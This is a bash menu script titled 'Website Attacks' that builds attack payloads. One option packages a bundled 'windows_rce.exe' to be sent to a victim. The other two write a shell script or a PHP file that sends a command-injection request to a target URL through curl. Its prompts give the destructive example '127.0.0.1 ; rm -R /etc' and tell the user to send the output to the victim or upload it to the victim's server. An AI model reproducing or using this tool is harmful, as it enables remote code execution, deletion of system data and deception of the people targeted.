clear
while :
do
echo ""
echo "Website Attacks"
echo "--------------------------------------"
echo ""
echo "  1.- Mirosoft Windows (DIR)"
echo "  2.- GNU/Linux (DIR)"
echo "  3.- HTTP Server (PHP)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [WebAttack]> "
read op351
case $op351 in
1) echo "[*] Target: Microsoft Windows System";
echo -n "Path to save the payload [WebAttack]> "
read pth111
echo -n "Name for the payload [WebAttack]> "
read name111
mkdir $pth111/$name111
cp bin/windows_rce.exe $pth111/$name111/$name111.exe
echo "Eg.: http://websi.te/name.php?vuln="
echo -n "Web Attack Target [WebAttack]> "
read target111
echo -n "Injection Code [WebAttack]> "
read inj111
echo "$target111" > $pth111/$name111/t.txt
echo "$inj111" > $pth111/$name111/c.txt
echo "[+] GENERATED IN: $pth111/$name111 ... NOW COMPRESS THE DIRECTORY AND SEND TO THE VICTIM!"
exit
;;
2) echo "[*] Target: GNU/Linux System";
echo -n "Path to save the payload [WebAttack]> "
read pth342
echo "Eg.: 127.0.0.1 ; rm -R /etc"
echo -n "Injection Code [WebAttack]> "
read inject0982
echo -n "Name for the payload [WebAttack]> "
read name342
echo "Eg.: http://websi.te/something.php?parameter"
echo "[¡] DO NOT WRITE '='!!"
echo -n "Web Attack Target [WebAttack]> "
read target132
echo "
#!/bin/bash
curl $target132=$inject0982" > $pth342/$name342.sh
echo "GENERATED IN: $pth342/$name342.sh NOW SEND IT TO VICTIM!"
exit
;;
3) echo "[*] Target: HTTP Server";
echo -n "Path to save the payload [WebAttack]> "
read pth0002
echo "Eg.: 127.0.0.1 ; rm -R /etc"
echo -n "Injection Code [WebAttack]> "
read inject0002
echo -n "Name for the payload [WebAttack]> "
read name0002
echo "Eg.: http://websi.te/something.php?parameter"
echo "[¡] DO NOT WRITE '='!!"
echo -n "Web Attack Target [WebAttack]> "
read target0002
echo "
<?php
system('curl $target0002=$inject0002');
?>" > $pth0002/$name0002.php
echo "[+] GENERATED IN: $pth0002/$name0002.php NOW UPLOAD IT TO VICTIM SERVER!"
exit
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op351 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done

